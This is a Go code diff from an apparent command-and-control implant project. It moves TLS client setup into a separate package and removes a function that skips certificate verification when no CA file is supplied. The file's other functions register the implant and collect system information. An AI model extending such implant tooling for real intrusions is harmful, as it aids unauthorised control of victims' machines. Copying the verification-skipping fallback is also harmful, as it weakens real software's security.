@@ -3,7 +3,6 @@ package main
 import (
 	"context"
 	"crypto/tls"
-	"crypto/x509"
 	"encoding/base64"
 	"encoding/json"
 	"flag"
@@ -24,6 +23,7 @@ import (
 
 	"github.com/azizbinmohammad/private-c2/pkg/envelope"
 	"github.com/azizbinmohammad/private-c2/pkg/protocol"
+	"github.com/azizbinmohammad/private-c2/pkg/tlsutil"
 )
 
 func sendMessage(conn net.Conn, msg *protocol.Message) error {
@@ -53,28 +53,6 @@ func generateImplantID() string {
 		b[i] = charset[rand.Intn(len(charset))]
 	}
 	return string(b)
-}
-
-func buildTLSConfig(caPath string) (*tls.Config, error) {
-	cfg := &tls.Config{
-		MinVersion: tls.VersionTLS13,
-	}
-
-	if caPath != "" {
-		caPEM, err := os.ReadFile(caPath)
-		if err != nil {
-			return nil, fmt.Errorf("read CA cert: %w", err)
-		}
-		pool := x509.NewCertPool()
-		if !pool.AppendCertsFromPEM(caPEM) {
-			return nil, fmt.Errorf("failed to parse CA cert")
-		}
-		cfg.RootCAs = pool
-	} else {
-		cfg.InsecureSkipVerify = true
-	}
-
-	return cfg, nil
 }
 
 func collectSystemInfo() protocol.RegisterData {
@@ -238,7 +216,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	tlsConfig, err := buildTLSConfig(*caPath)
+	tlsConfig, err := tlsutil.ClientTLSConfig(*caPath)
 	if err != nil {
 		log.Fatalf("tls config: %v", err)
 	}
